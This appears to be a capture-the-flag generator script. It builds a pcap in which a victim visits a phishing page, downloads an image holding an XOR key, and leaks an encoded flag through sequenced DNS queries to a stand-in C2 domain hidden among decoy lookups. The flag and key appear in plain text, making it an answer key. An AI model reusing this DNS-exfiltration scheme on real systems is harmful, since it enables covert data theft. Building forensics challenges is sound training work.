import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
from scapy.all import IP, UDP, DNS, DNSQR, wrpcap
from net import tcp_session, stamp
import random
random.seed(1337)

PHISH = "hot-milf-wants-to-talk-to-you.net"
KEY = b"stress"
FLAG = b"Securinets{t1t1_str3sse_y4_zeeeeeeeee**}"

VICTIM, WEB, DNSSRV = "10.0.0.50", "93.184.21.7", "10.0.0.53"

# --- encode flag ---
xored = bytes(FLAG[i] ^ KEY[i % len(KEY)] for i in range(len(FLAG)))
h = xored.hex()
chunks = [h[i:i+16] for i in range(0, len(h), 16)]

# --- HTTP: victim loads the phishing page ---
page = (f"<html><body><h1>Account Verification</h1>"
        f"<p>Confirm your identity.</p>"
        f"<img src='/static/hacked.png'></body></html>").encode()
pkts = []
pkts += tcp_session(VICTIM, WEB, 51000, 80,
    [("c", f"GET /account/verify HTTP/1.1\r\nHost: {PHISH}\r\n\r\n".encode()),
     ("s", b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n"
           b"Content-Length: " + str(len(page)).encode() + b"\r\n\r\n" + page)])

# --- HTTP: the photo (with the key) is downloaded ---
img = open("hacked.png", "rb").read()
hdr = (b"HTTP/1.1 200 OK\r\nContent-Type: image/png\r\n"
       b"Content-Length: " + str(len(img)).encode() + b"\r\n\r\n")
raw = hdr + img
segs = [("s", raw[i:i+1400]) for i in range(0, len(raw), 1400)]
pkts += tcp_session(VICTIM, WEB, 51001, 80,
    [("c", f"GET /static/hacked.png HTTP/1.1\r\nHost: {PHISH}\r\n\r\n".encode())] + segs)

# --- DNS exfil: flag leaves encoded, with a seq number ---
noise = ["google.com","github.com","windowsupdate.com","cdn.cloudflare.net"]
for i, c in enumerate(chunks):
    for _ in range(random.randint(1,3)):
        pkts.append(IP(src=VICTIM, dst=DNSSRV)/UDP(sport=random.randint(1024,65535), dport=53)
                    /DNS(rd=1, qd=DNSQR(qname=random.choice(noise))))
    # seq.chunk.c2domain  → seq lets players reorder
    pkts.append(IP(src=VICTIM, dst=DNSSRV)/UDP(sport=random.randint(1024,65535), dport=53)
                /DNS(rd=1, qd=DNSQR(qname=f"{i:02d}.{c}.exfil.nexus-c2.net")))

wrpcap("incident.pcap", stamp(pkts))
print("[+] incident.pcap written")
